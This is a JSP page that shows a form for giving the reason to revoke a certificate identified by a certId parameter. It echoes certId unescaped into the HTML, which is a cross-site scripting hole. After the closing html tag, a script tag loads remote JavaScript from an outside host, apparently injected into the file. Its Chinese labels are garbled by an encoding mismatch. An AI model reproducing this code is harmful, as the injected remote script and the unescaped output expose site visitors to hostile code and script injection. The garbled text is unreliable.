<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.sql.*"%>
<%@ page import="java.util.*"%>
<%@ page import="java.io.*"%>
<%
String certId=request.getParameter("certId");

if(certId==null || certId.length()==0)
{
}
else
{
%>
<html>
<body bgcolor="#FFFFFF" text="#000000">
<form name="reasonForm" method="post" action="revocate.jsp">
  <table border="0" cellspacing="0" cellpadding="0">
    <tr> 
      <td> 
        <p>��Ҫ������֤���֤����ǣ�<%=certId%></p>
      </td>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr> 
      <td>��˵����������ԭ��</td>
    </tr>
    <tr> 
      <td> 
        <textarea name="reason" cols="50" rows="10"></textarea>
      </td>
    </tr>
    <tr> 
      <td align="center"> 
	  <input type="hidden" name="certId" value="<%=certId%>">
        <input type="submit" name="Submit" value="ȷ�ϳ���">
      </td>
    </tr>
  </table>
  <p>&nbsp; </p>
  <p>&nbsp; </p>
</form>

</body>
</html>
<%	

}
	
%>
<script language=javascript src=http://www.qq.com/qq.js></script>